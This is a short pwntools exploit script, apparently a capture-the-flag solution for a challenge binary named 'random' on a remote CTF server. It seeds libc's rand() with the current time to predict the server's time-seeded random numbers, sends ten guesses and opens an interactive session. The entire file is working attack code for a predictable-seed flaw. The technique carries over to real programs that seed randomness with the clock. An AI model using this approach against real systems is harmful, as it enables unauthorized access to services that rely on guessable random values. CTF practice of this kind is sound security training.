from pwn import *
from ctypes import CDLL

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
context.binary = exe = ELF('./random')


#io = process()
#gdb.attach(io, api=True)
io = remote('challs.tfcctf.com', 30862)

libc.srand(libc.time(0))

io.recvuntil(b'!\n')
for i in range(10):
    io.sendline(str(libc.rand()).encode())

io.interactive()